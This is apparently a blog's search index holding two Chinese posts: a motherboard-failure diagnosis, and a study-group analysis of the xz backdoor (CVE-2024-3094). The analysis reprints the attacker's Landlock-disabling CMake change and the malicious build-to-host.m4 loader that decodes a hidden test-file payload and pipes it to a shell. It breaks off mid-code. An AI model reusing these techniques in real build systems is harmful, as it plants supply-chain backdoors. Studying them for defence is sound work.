<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>Asus X99 通病</title>
      <link href="/asus-x99-code-00/"/>
      <url>/asus-x99-code-00/</url>
      
        <content type="html"><![CDATA[<h1 id="前情提要">前情提要</h1><p>簡單來說，當時我正在讓服務器跑從遠端備份回來文件的哈希來驗證完整性，結果回頭一看服務器，發現就關機了。</p><h2 id="症狀">症狀</h2><p>此時CPU右上角的紅色LED亮起，按開機鍵都無反應，斷電重新上電紅色LED仍然點亮，這個時候我的第一猜測是可能是CPU過熱，也許讓他散熱一下就能好了。</p><p>在過一陣子重新上電後，紅色LED不亮了，現在按開機鍵則變成整台機器的LED瞬間閃爍一次，主板偵錯碼(Q-code)也是和LED一樣瞬間閃00後，之後按開機鍵也無任何反應，不過將電源供應器重新上電後又會有同樣的行為。</p><h1 id="偵錯">偵錯</h1><p>在經過Google搜尋X99的這些症狀後，我最後定位到了一個可能的問題——華碩X99通病(MOS擊穿燒CPU)</p>    <div class="fold">      <div class="fold-title fold-default collapsed" data-toggle="collapse" href="#collapse-d9a9cf04" role="button" aria-expanded="false" aria-controls="collapse-d9a9cf04">        <div class="fold-arrow">▶</div>網路上其他人遇到的狀況      </div>      <div class="fold-collapse collapse" id="collapse-d9a9cf04">        <div class="fold-content">          <p><a href="https://www.techpowerup.com/forums/threads/asus-x99-deluxe-a-ii-failed.262537/">ASUS X99-DELUXE A-II Failed | TechPowerUp Forums</a><sup id="fnref:1" class="footnote-ref"><a href="#fn:1" rel="footnote"><span class="hint--top hint--rounded" aria-label="[ASUS X99-DELUXE A-II Failed | TechPowerUp Forums](https://www.techpowerup.com/forums/threads/asus-x99-deluxe-a-ii-failed.262537/)">[1]</span></a></sup></p><p><a href="https://www.overclock.net/threads/asus-x99-a-ii-code-00-not-listed-red-cpu-light-on.1615149/">ASUS X99 A-II Code 00 (Not Listed) Red CPU Light On | Overclock.net</a><sup id="fnref:2" class="footnote-ref"><a href="#fn:2" rel="footnote"><span class="hint--top hint--rounded" aria-label="[ASUS X99 A-II Code 00 (Not Listed) Red CPU Light On | Overclock.net](https://www.overclock.net/threads/asus-x99-a-ii-code-00-not-listed-red-cpu-light-on.1615149/)">[2]</span></a></sup></p><p><a href="https://www.reddit.com/r/buildapc/comments/5sywuu/x99_a_ii_will_not_post/">X99 A II will not POST!! : r/buildapc</a><sup id="fnref:3" class="footnote-ref"><a href="#fn:3" rel="footnote"><span class="hint--top hint--rounded" aria-label="[X99 A II will not POST!! : r/buildapc](https://www.reddit.com/r/buildapc/comments/5sywuu/x99_a_ii_will_not_post/)">[3]</span></a></sup></p><p><a href="https://forums.tomshardware.com/threads/asus-x99-a-ii-suddenly-shutdown-and-now-giving-q-code-00.2915943/">Asus X99-A II suddenly shutdown and now giving Q code 00 | Tom’s Hardware Forum</a><sup id="fnref:4" class="footnote-ref"><a href="#fn:4" rel="footnote"><span class="hint--top hint--rounded" aria-label="[Asus X99-A II suddenly shutdown and now giving Q code 00 | Tom's Hardware Forum](https://forums.tomshardware.com/threads/asus-x99-a-ii-suddenly-shutdown-and-now-giving-q-code-00.2915943/)">[4]</span></a></sup></p>        </div>      </div>    </div><h1 id="檢測">檢測</h1><p>那麼，對電腦的錯誤有了猜測，接下來就是檢測了</p><h2 id="主機板">主機板</h2>    <div class="fold">      <div class="fold-title fold-default collapsed" data-toggle="collapse" href="#collapse-55b26b0e" role="button" aria-expanded="false" aria-controls="collapse-55b26b0e">        <div class="fold-arrow">▶</div>CPU供電針腳定義      </div>      <div class="fold-collapse collapse" id="collapse-55b26b0e">        <div class="fold-content">          <p><img src="cpu_power_pin.png" alt=""></p>        </div>      </div>    </div><p>首先將三用電表打到測通檔(二極體檔)，量測CPU供電12V和電感下端</p><p>12V對電感下端短路，這邊就基本可以宣告CPU死定了，12V直衝CPU</p><div class="group-image-container"><div class="group-image-row"><div class="group-image-wrap"><img src="mb_cpu_12V_test1.jpg" alt=""></div><div class="group-image-wrap"><img src="mb_cpu_12V_test2.jpg" alt=""></div></div></div><p>同時12V也對地短路了</p><p>這也可以解釋為什麼之前開機一瞬間燈會閃一下，但之後按開機卻再也沒有反應，直到斷電重來。</p><p>主板在開機按下時短接PS_ON和GND，拉低PS_ON，電源啟動，輸出12V，但是CPU供電短路，電源供應器自動保護斷電，之後也不開啓，直到斷電重置。</p>    <div class="fold">      <div class="fold-title fold-default collapsed" data-toggle="collapse" href="#collapse-2f23950e" role="button" aria-expanded="false" aria-controls="collapse-2f23950e">        <div class="fold-arrow">▶</div>主機板供電針腳定義      </div>      <div class="fold-collapse collapse" id="collapse-2f23950e">        <div class="fold-content">          <p><img src="mb_power_pin.jpg" alt=""></p>        </div>      </div>    </div><p>現在知道主機板有短路後，就繼續排查哪裡出了問題，首先拆下供電散熱檢查底下的MOS</p><div class="group-image-container"><div class="group-image-row"><div class="group-image-wrap"><img src="mb_mos.jpg" alt=""></div><div class="group-image-wrap"><img src="mos.jpg" alt=""></div><div class="group-image-wrap"><img src="mos_datasheet.png" alt=""></div></div></div><p>MOS的型號是0812ND，查看datasheet可以知道這是一顆集成上下管的IC。</p><p>需要量測的就是這顆IC裡的上下管正不正常。</p><p>首先量測上管，也就是1腳和2/3/4任一腳(Gate和Drain，圓點位置代表第一腳)，發現右數第三顆的阻值不對(左圖)，右圖則是正常的MOS應該有的讀值。</p><div class="group-image-container"><div class="group-image-row"><div class="group-image-wrap"><img src="mos_test_bad.jpg" alt=""></div><div class="group-image-wrap"><img src="mos_test_good.jpg" alt=""></div></div></div><p>這代表第三顆MOS的上管擊穿了直接短路，Vphase(Source)在底下連到電感，12V直接導到CPU。</p><p>順便量測了所有的下管，結果都是正常。</p><p>理論上只要更換壞掉的MOS應該就能修好這塊主板，等之後有時間再來修。</p><h2 id="CPU">CPU</h2><p>雖然前面已經猜測這顆CPU死定了，不過不看到確切的結果還是不會認命</p><p>首先要找到2011-3腳位的定義，不過幸好已經有人幫我們畫出來了</p><p><a href="https://imgur.com/gallery/intel-socket-2011v3-land-grid-layout-thanks-sdgus68-12PjUu8">Intel Socket 2011v3 Land Grid Layout. (Thanks sdgus68!) - computer hardware post - Imgur</a><sup id="fnref:5" class="footnote-ref"><a href="#fn:5" rel="footnote"><span class="hint--top hint--rounded" aria-label="[Intel Socket 2011v3 Land Grid Layout. (Thanks sdgus68!) - computer hardware post - Imgur](https://imgur.com/gallery/intel-socket-2011v3-land-grid-layout-thanks-sdgus68-12PjUu8)">[5]</span></a></sup></p><p><a href="https://www.reddit.com/r/intel/comments/lpp83e/lga20113_landlayout/">LGA2011-3 Land-Layout : r/intel</a><sup id="fnref:6" class="footnote-ref"><a href="#fn:6" rel="footnote"><span class="hint--top hint--rounded" aria-label="[LGA2011-3 Land-Layout : r/intel](https://www.reddit.com/r/intel/comments/lpp83e/lga20113_landlayout/)">[6]</span></a></sup></p><p>我是使用第一份，我覺得那比較直觀</p>    <div class="fold">      <div class="fold-title fold-default collapsed" data-toggle="collapse" href="#collapse-10ab6213" role="button" aria-expanded="false" aria-controls="collapse-10ab6213">        <div class="fold-arrow">▶</div>第一份使用的參考文件      </div>      <div class="fold-collapse collapse" id="collapse-10ab6213">        <div class="fold-content">          <p>Imgur原文有提供下載連結，但是有一個已經失效了，可以從<a href="http://szarka.ssgg.sk/Vyuka/2014/HighEnd-LGA2011/core-i7-lga2011-3-tmsdg.pdf">這裡</a>觀看，或是在底下下載</p><p><a href="core-i7-lga2011-3-tmsdg.pdf">core-i7-lga2011-3-tmsdg.pdf</a>的52頁有針腳編號的定義</p><p><a href="core-i7-lga2011-3-datasheet-vol-1">core-i7-lga2011-3-datasheet-vol-1</a>的64頁開始有編號對應的用途</p>        </div>      </div>    </div><p><img src="2011-3_layout.png" alt=""></p><p>量測V<sub>CC</sub>和V<sub>SS</sub>的阻值，可以理解為供電和GND，發現短路，徹底給CPU判死刑</p><video controls width="500">  <source src="cpu_test.mp4" type="video/mp4" /></video><h2 id="參考">參考</h2><section class="footnotes"><div class="footnote-list"><ol><li><span id="fn:1" class="footnote-text"><span><a href="https://www.techpowerup.com/forums/threads/asus-x99-deluxe-a-ii-failed.262537/">ASUS X99-DELUXE A-II Failed | TechPowerUp Forums</a><a href="#fnref:1" rev="footnote" class="footnote-backref"> ↩</a></span></span></li><li><span id="fn:2" class="footnote-text"><span><a href="https://www.overclock.net/threads/asus-x99-a-ii-code-00-not-listed-red-cpu-light-on.1615149/">ASUS X99 A-II Code 00 (Not Listed) Red CPU Light On | Overclock.net</a><a href="#fnref:2" rev="footnote" class="footnote-backref"> ↩</a></span></span></li><li><span id="fn:3" class="footnote-text"><span><a href="https://www.reddit.com/r/buildapc/comments/5sywuu/x99_a_ii_will_not_post/">X99 A II will not POST!! : r/buildapc</a><a href="#fnref:3" rev="footnote" class="footnote-backref"> ↩</a></span></span></li><li><span id="fn:4" class="footnote-text"><span><a href="https://forums.tomshardware.com/threads/asus-x99-a-ii-suddenly-shutdown-and-now-giving-q-code-00.2915943/">Asus X99-A II suddenly shutdown and now giving Q code 00 | Tom’s Hardware Forum</a><a href="#fnref:4" rev="footnote" class="footnote-backref"> ↩</a></span></span></li><li><span id="fn:5" class="footnote-text"><span><a href="https://imgur.com/gallery/intel-socket-2011v3-land-grid-layout-thanks-sdgus68-12PjUu8">Intel Socket 2011v3 Land Grid Layout. (Thanks sdgus68!) - computer hardware post - Imgur</a><a href="#fnref:5" rev="footnote" class="footnote-backref"> ↩</a></span></span></li><li><span id="fn:6" class="footnote-text"><span><a href="https://www.reddit.com/r/intel/comments/lpp83e/lga20113_landlayout/">LGA2011-3 Land-Layout : r/intel</a><a href="#fnref:6" rev="footnote" class="footnote-backref"> ↩</a></span></span></li></ol></div></section>]]></content>
      
      
      <categories>
          
          <category> 教程 </category>
          
          <category> 疑難雜症 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 3C硬體 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>有關xz漏洞產生的時間線和原理</title>
      <link href="/xz-CVE-2024-3094/"/>
      <url>/xz-CVE-2024-3094/</url>
      
        <content type="html"><![CDATA[<h1 id="前言">前言</h1><p>這次主要是準備NCKUCTF的讀書會的主題，順便記錄一下</p><h1 id="時間線">時間線</h1><p><strong>2021-01-27：</strong> 創建JiaT75的Github帳號</p><p><strong>2022-02-07：</strong> 第一次對xz進行<a href="https://github.com/tukaani-project/xz/commit/6468f7e41a8e9c611e4ba8d34e2175c5dacdbeb4">commit</a></p><p><strong>2022-05：</strong> Jia Tan成為了xz的maintainer，被登記到oss-fuzz xz的contact</p><p><strong>2024-02-23：</strong> 上傳了一些測試檔案（包含了含有惡意payload的檔案<code>tests/files/bad-3-corrupt_lzma2.xz</code>、<code>tests/files/good-large_compressed.lzma</code>），<a href="https://github.com/tukaani-project/xz/commit/cf44e4b7f5dfdbf8c78aef377c10f71e274f63c0">commit</a></p><p><strong>2024-02-24：</strong> 發布了5.6.0的tarball，包含了帶有問題的build-to-host.m4，帶有後門</p><p><strong>2024-02-26：</strong> 修改了CMakeLists.txt，關閉了Landlock功能，<a href="https://github.com/tukaani-project/xz/commit/328c52da8a2bbb81307644efdb58db2c422d9ba7">commit</a></p><p><strong>2024-03-09：</strong> 修改了測試檔案（<code>tests/files/bad-3-corrupt_lzma2.xz</code>、<code>tests/files/good-large_compressed.lzma</code>），<a href="https://github.com/tukaani-project/xz/commit/6e636819e8f070330d835fce46289a3ff72a7b89">commit</a></p><p><strong>2024-03-09：</strong> 發布了5.6.0的tarball，同樣帶有後門</p><p><strong>2024-03-29：</strong> Andres Freund在測試debian sid時<a href="https://www.openwall.com/lists/oss-security/2024/03/29/4">發現後門</a><sup id="fnref:1" class="footnote-ref"><a href="#fn:1" rel="footnote"><span class="hint--top hint--rounded" aria-label="[oss-security - backdoor in upstream xz/liblzma leading to ssh server compromise](https://www.openwall.com/lists/oss-security/2024/03/29/4)">[1]</span></a></sup></p>    <div class="fold">      <div class="fold-title fold-info collapsed" data-toggle="collapse" href="#collapse-ae99882e" role="button" aria-expanded="false" aria-controls="collapse-ae99882e">        <div class="fold-arrow">▶</div>有關m4/build-to-host.m4      </div>      <div class="fold-collapse collapse" id="collapse-ae99882e">        <div class="fold-content">          <p>這個檔案不包含在git的source file中，只存在於5.6.0和5.6.1的tarball中，可以在<a href="https://web.archive.org/web/*/https://github.com/tukaani-project/xz/releases/download/*">web archieve</a>中下載，或是點<a href="xz-5.6.0.tar.zst">xz-5.6.0.tar.zst</a>、<a href="xz-5.6.1.tar.zst">xz-5.6.1.tar.zst</a>下載</p><blockquote><p>在C的專案中，有些檔案只存在於tarball，在git中不存在是正常的，因為下游的使用者不需要去知道怎麼用autotools和autoconf<sup id="fnref:2" class="footnote-ref"><a href="#fn:2" rel="footnote"><span class="hint--top hint--rounded" aria-label="[FAQ on the xz-utils backdoor (CVE-2024-3094)](https://gist.github.com/thesamesam/223949d5a074ebc3dce9ee78baad9e27#design)">[2]</span></a></sup>，不過攻擊者利用了這個慣例，沒有將開啟後門的關鍵放入git中</p></blockquote><h2 id="有關m4-gitignore">有關m4/.gitignore.</h2><figure class="highlight diff"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs diff"><span class="hljs-addition">+ build-to-host.m4</span><br>  codeset.m4<br>  extern-inline.m4<br>  fcntl-o.m4<br></code></pre></td></tr></table></figure><p>這個其實和攻擊沒什麼關係，不過github上這個<a href="https://github.com/tukaani-project/xz/commit/4323bc3e0c1e1d2037d5e670a3bf6633e8a3031e">commit</a>的<a href="https://github.com/tukaani-project/xz/commit/4323bc3e0c1e1d2037d5e670a3bf6633e8a3031e#commitcomment-140386077">留言</a>挺有意思</p><p><img src="github_comment.png" alt=""></p>        </div>      </div>    </div>    <div class="fold">      <div class="fold-title fold-info collapsed" data-toggle="collapse" href="#collapse-7d97e640" role="button" aria-expanded="false" aria-controls="collapse-7d97e640">        <div class="fold-arrow">▶</div>有關Landlock      </div>      <div class="fold-collapse collapse" id="collapse-7d97e640">        <div class="fold-content">          <p>懶人包</p><p>這是一種在linux內核(&gt;5.15)實現的安全模型，讓process在較低權限運行，且限制其對系統資源的訪問，可用於創建沙盒和隔離危險操作<sup id="fnref:3" class="footnote-ref"><a href="#fn:3" rel="footnote"><span class="hint--top hint--rounded" aria-label="[landlock(7) - Linux manual page](https://man7.org/linux/man-pages/man7/landlock.7.html)">[3]</span></a></sup></p><p>使用sys/prctl.h中的prctl()來配置landlock</p>        </div>      </div>    </div>    <div class="fold">      <div class="fold-title fold-info collapsed" data-toggle="collapse" href="#collapse-976a22fc" role="button" aria-expanded="false" aria-controls="collapse-976a22fc">        <div class="fold-arrow">▶</div>Lasse Collin在收到的郵件中被要求新增維護者      </div>      <div class="fold-collapse collapse" id="collapse-976a22fc">        <div class="fold-content">          <p>以下資訊來自此<a href="https://www.mail-archive.com/xz-devel@tukaani.org/msg00562.html">Mail Archieve</a></p><p><strong>2022-05-19：</strong> Dennis Ens詢問XZ for java是否還在開發</p><p><strong>2022-05-19：</strong> Lasse Collin回覆表示有很多工作在處理，但是仍有在開發，只是精力比較專注於XZ Utils的開發，在最後提到 Jia Tan在未來可能會發揮更多作用</p><p><strong>2022-06-07：</strong> Jigar Kumar回覆施壓Lasse Collin要求他為項目新增維護者</p><p><strong>2022-06-08：</strong> Lasse Collin回覆表示他有長期的心理問題，這個項目是一個無償維護的項目，他仍然有在努力開發，再次提到 Jia Tan在未來可能會發揮更多作用</p><p><strong>2022-06-14：</strong> Jigar Kumar回復懷疑他們是否能夠如其發布版本，再次要求新增維護者</p><p><strong>2022-06-21：</strong> Dennis Ens對Lasse Collin的心理問題感到抱歉，同樣也要求新增維護者</p><p><strong>2022-06-29：</strong> Lasse Collin最後回覆新增維護者他已經思考很久了，Jia Tan很有可能在未來發生更大的作用</p>        </div>      </div>    </div><h1 id="攻擊手法">攻擊手法</h1><h2 id="CMakeLists-txt">CMakeLists.txt</h2><figure class="highlight diff"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs diff"> # Sandboxing: Landlock<br> if(NOT SANDBOX_FOUND AND ENABLE_SANDBOX MATCHES &quot;^ON$|^landlock$&quot;)<br><span class="hljs-deletion">-    check_include_file(linux/landlock.h HAVE_LINUX_LANDLOCK_H)</span><br><span class="hljs-addition">+    # A compile check is done here because some systems have</span><br><span class="hljs-addition">+    # linux/landlock.h, but do not have the syscalls defined</span><br><span class="hljs-addition">+    # in order to actually use Linux Landlock.</span><br><span class="hljs-addition">+    check_c_source_compiles(&quot;</span><br><span class="hljs-addition">+        #include &lt;linux/landlock.h&gt;</span><br><span class="hljs-addition">+        #include &lt;sys/syscall.h&gt;</span><br><span class="hljs-addition">+        #include &lt;sys/prctl.h&gt;</span><br><span class="hljs-addition">+.</span><br><span class="hljs-addition">+        void my_sandbox(void)</span><br><span class="hljs-addition">+        &#123;</span><br><span class="hljs-addition">+            (void)prctl(PR_SET_NO_NEW_PRIVS, 1, 0, 0, 0);</span><br><span class="hljs-addition">+            (void)SYS_landlock_create_ruleset;</span><br><span class="hljs-addition">+            (void)SYS_landlock_restrict_self;</span><br><span class="hljs-addition">+            (void)LANDLOCK_CREATE_RULESET_VERSION;</span><br><span class="hljs-addition">+            return;</span><br><span class="hljs-addition">+        &#125;</span><br><span class="hljs-addition">+        int main(void) &#123; return 0; &#125;</span><br><span class="hljs-addition">+        &quot;</span><br><span class="hljs-addition">+    HAVE_LINUX_LANDLOCK)</span><br><br><span class="hljs-deletion">-    if(HAVE_LINUX_LANDLOCK_H)</span><br><span class="hljs-deletion">-        set(SANDBOX_COMPILE_DEFINITION &quot;HAVE_LINUX_LANDLOCK_H&quot;)</span><br><span class="hljs-addition">+    if(HAVE_LINUX_LANDLOCK)</span><br><span class="hljs-addition">+        set(SANDBOX_COMPILE_DEFINITION &quot;HAVE_LINUX_LANDLOCK&quot;)</span><br>         set(SANDBOX_FOUND ON)<br><span class="hljs-comment">------</span><br></code></pre></td></tr></table></figure><p><a href="https://github.com/tukaani-project/xz/commit/328c52da8a2bbb81307644efdb58db2c422d9ba7#diff-1e7de1ae2d059d21e1dd75d5812d5a34b0222cef273b7c3a2af62eb747f9d20a">Github上的commit</a></p>    <div class="fold">      <div class="fold-title fold-info collapsed" data-toggle="collapse" href="#collapse-d19941a8" role="button" aria-expanded="false" aria-controls="collapse-d19941a8">        <div class="fold-arrow">▶</div>check_c_source_compiles與check_include_file      </div>      <div class="fold-collapse collapse" id="collapse-d19941a8">        <div class="fold-content">          <p>這兩個是cmake定義的函數</p><h3 id="check-c-source-compiles">check_c_source_compiles</h3><figure class="highlight cmake"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs cmake">check_c_source_compiles(&lt;code&gt; &lt;resultVar&gt;<br>                        [FAIL_REGEX &lt;regex1&gt; [&lt;regex2&gt;...]])<br></code></pre></td></tr></table></figure><p>這會檢查<code>&lt;code&gt;</code>的原始碼能否被編譯成連接檔，並將結果存於<code>&lt;resultVar&gt;</code>中<sup id="fnref:4" class="footnote-ref"><a href="#fn:4" rel="footnote"><span class="hint--top hint--rounded" aria-label="[CheckCSourceCompiles — CMake 3.29.2 Documentation](https://cmake.org/cmake/help/latest/module/CheckCSourceCompiles.html)">[4]</span></a></sup></p><h3 id="check-include-file">check_include_file</h3><figure class="highlight cmake"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cmake">CHECK_INCLUDE_FILE(&lt;<span class="hljs-keyword">include</span>&gt; &lt;variable&gt; [&lt;flags&gt;])<br></code></pre></td></tr></table></figure><p>這會檢查<code>&lt;include&gt;</code>是否能被引入，並將結果存於<code>&lt;variable&gt;</code>中<sup id="fnref:5" class="footnote-ref"><a href="#fn:5" rel="footnote"><span class="hint--top hint--rounded" aria-label="[CheckIncludeFile — CMake 3.29.2 Documentation](https://cmake.org/cmake/help/latest/module/CheckIncludeFile.html)">[5]</span></a></sup></p>        </div>      </div>    </div><p>這一段的用處是檢查編譯機器是否能啟用Landlock feature</p><p>原本是使用<code>check_include_file()</code>來檢查，Jia Tan將其改為使用<code>check_c_source_compiles()</code>來檢查</p><p>理論上這樣更換並不會造成問題，但是在第11行的行首可以看到多了一個<code>.</code>，這導致這段C code會編譯失敗，因此關閉了Landlock，不管在任何的機器上都會關閉，而不是原本的邏輯，只在不支援的機器關閉</p><h2 id="m4-build-to-host-m4">m4/build-to-host.m4</h2><p>5.6.0中的<a href="build-to-host.m4">build-to-host.m4</a>與5.6.1中的完全相同</p><p>攻擊者對標準的build-to-host.m4進行修改，差異如下</p><figure class="highlight diff"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><code class="hljs diff"><span class="hljs-meta">@@ -1,5 +1,5 @@</span><br><span class="hljs-deletion">-# build-to-host.m4 serial 3</span><br><span class="hljs-deletion">-dnl Copyright (C) 2023 Free Software Foundation, Inc.</span><br><span class="hljs-addition">+# build-to-host.m4 serial 30</span><br><span class="hljs-addition">+dnl Copyright (C) 2023-2024 Free Software Foundation, Inc.</span><br> dnl This file is free software; the Free Software Foundation<br> dnl gives unlimited permission to copy and/or distribute it,<br> dnl with or without modifications, as long as this notice is preserved.<br><span class="hljs-meta">@@ -37,6 +37,7 @@</span> AC_DEFUN([gl_BUILD_TO_HOST],<br><br><br>   dnl Define somedir_c.<br>   gl_final_[$1]=&quot;$[$1]&quot;<br><span class="hljs-addition">+  gl_[$1]_prefix=`echo $gl_am_configmake | sed &quot;s/.*\.//g&quot;`</span><br>   dnl Translate it from build syntax to host syntax.<br>   case &quot;$build_os&quot; in<br>     cygwin*)<br><span class="hljs-meta">@@ -58,14 +59,40 @@</span> AC_DEFUN([gl_BUILD_TO_HOST],<br>   if test &quot;$[$1]_c_make&quot; = &#x27;\&quot;&#x27;&quot;$&#123;gl_final_[$1]&#125;&quot;&#x27;\&quot;&#x27;; then<br>     [$1]_c_make=&#x27;\&quot;$([$1])\&quot;&#x27;<br>   fi<br><span class="hljs-addition">+  if test &quot;x$gl_am_configmake&quot; != &quot;x&quot;; then</span><br><span class="hljs-addition">+    gl_[$1]_config=&#x27;sed \&quot;r\n\&quot; $gl_am_configmake | eval $gl_path_map | $gl_[$1]_prefix -d 2&gt;/dev/null&#x27;</span><br><span class="hljs-addition">+  else</span><br><span class="hljs-addition">+    gl_[$1]_config=&#x27;&#x27;</span><br><span class="hljs-addition">+  fi</span><br><span class="hljs-addition">+  _LT_TAGDECL([], [gl_path_map], [2])dnl</span><br><span class="hljs-addition">+  _LT_TAGDECL([], [gl_[$1]_prefix], [2])dnl</span><br><span class="hljs-addition">+  _LT_TAGDECL([], [gl_am_configmake], [2])dnl</span><br><span class="hljs-addition">+  _LT_TAGDECL([], [[$1]_c_make], [2])dnl</span><br><span class="hljs-addition">+  _LT_TAGDECL([], [gl_[$1]_config], [2])dnl</span><br>   AC_SUBST([$1_c_make])<br><span class="hljs-addition">+</span><br><span class="hljs-addition">+  dnl If the host conversion code has been placed in $gl_config_gt,</span><br><span class="hljs-addition">+  dnl instead of duplicating it all over again into config.status,</span><br><span class="hljs-addition">+  dnl then we will have config.status run $gl_config_gt later, so it</span><br><span class="hljs-addition">+  dnl needs to know what name is stored there:</span><br><span class="hljs-addition">+  AC_CONFIG_COMMANDS([build-to-host], [eval $gl_config_gt | $SHELL 2&gt;/dev/null], [gl_config_gt=&quot;eval \$gl_[$1]_config&quot;])</span><br> ])<br><br><br> dnl Some initializations for gl_BUILD_TO_HOST.<br> AC_DEFUN([gl_BUILD_TO_HOST_INIT],<br> [<br><span class="hljs-addition">+  dnl Search for Automake-defined pkg* macros, in the order</span><br><span class="hljs-addition">+  dnl listed in the Automake 1.10a+ documentation.</span><br><span class="hljs-addition">+  gl_am_configmake=`grep -aErls &quot;#&#123;4&#125;[[:alnum:]]&#123;5&#125;#&#123;4&#125;$&quot; $srcdir/ 2&gt;/dev/null`</span><br><span class="hljs-addition">+  if test -n &quot;$gl_am_configmake&quot;; then</span><br><span class="hljs-addition">+    HAVE_PKG_CONFIGMAKE=1</span><br><span class="hljs-addition">+  else</span><br><span class="hljs-addition">+    HAVE_PKG_CONFIGMAKE=0</span><br><span class="hljs-addition">+  fi</span><br><span class="hljs-addition">+</span><br>   gl_sed_double_backslashes=&#x27;s/\\/\\\\/g&#x27;<br>   gl_sed_escape_doublequotes=&#x27;s/&quot;/\\&quot;/g&#x27;<br><span class="hljs-addition">+  gl_path_map=&#x27;tr &quot;\t \-_&quot; &quot; \t_\-&quot;&#x27;</span><br> changequote(,)dnl<br>   gl_sed_escape_for_make_1=&quot;s,\\([ \&quot;&amp;&#x27;();&lt;&gt;\\\\\`|]\\),\\\\\\1,g&quot;<br> changequote([,])dnl<br></code></pre></td></tr></table></figure><p>先將檔案中的變數解析出來</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs shell">gl_am_configmake=`grep -aErls &quot;#&#123;4&#125;[[:alnum:]]&#123;5&#125;#&#123;4&#125;$&quot; $srcdir/ 2&gt;/dev/null`<br>gl_am_configmake=$srcdir/tests/files/bad-3-corrupt_lzma2.xz<br>gl_path_map=&#x27;tr &quot;\t \-_&quot; &quot; \t_\-&quot;&#x27;<br><span class="hljs-meta prompt_">gl_[$</span><span class="language-bash">1]_prefix=`<span class="hljs-built_in">echo</span> <span class="hljs-variable">$gl_am_configmake</span> | sed <span class="hljs-string">&quot;s/.*\.//g&quot;</span>`</span><br><span class="hljs-meta prompt_">gl_[$</span><span class="language-bash">1]_prefix=xz</span><br></code></pre></td></tr></table></figure><p>在這段邏輯中，將會檢查是否有設定<code>gl_am_configmake</code>變數，如果沒有，後門將不會啟動</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs shell">if test &quot;x$gl_am_configmake&quot; != &quot;x&quot;; then<br><span class="hljs-meta prompt_">  gl_[$</span><span class="language-bash">1]_config=<span class="hljs-string">&#x27;sed \&quot;r\n\&quot; $gl_am_configmake | eval $gl_path_map | $gl_[$1]_prefix -d 2&gt;/dev/null&#x27;</span></span><br>else<br><span class="hljs-meta prompt_">  gl_[$</span><span class="language-bash">1]_config=<span class="hljs-string">&#x27;&#x27;</span></span><br>fi<br></code></pre></td></tr></table></figure><p><code>gl_[$1]_config</code>將在<code>AC_CONFIG_COMMANDS([build-to-host], [eval $gl_config_gt | $SHELL 2&gt;/dev/null], [gl_config_gt=&quot;eval \$gl_[$1]_config&quot;])</code>中執行</p><p>如果變數存在，<code>gl_[$1]_config</code>將會從<code>tests/files/bad-3-corrupt_lzma2.xz</code>中拿到phase 1 payload，在5.6.0和5.6.1版本具有差異</p><p><strong>5.6.0</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">gl_[$</span><span class="language-bash">1]_config=<span class="hljs-string">&#x27;sed \&quot;r\n\&quot; $gl_am_configmake | eval $gl_path_map | $gl_[$1]_prefix -d 2&gt;/dev/null&#x27;</span></span><br><span class="hljs-meta prompt_">gl_[$</span><span class="language-bash">1]_config=`</span><br><span class="hljs-meta prompt_">#</span><span class="language-bash"><span 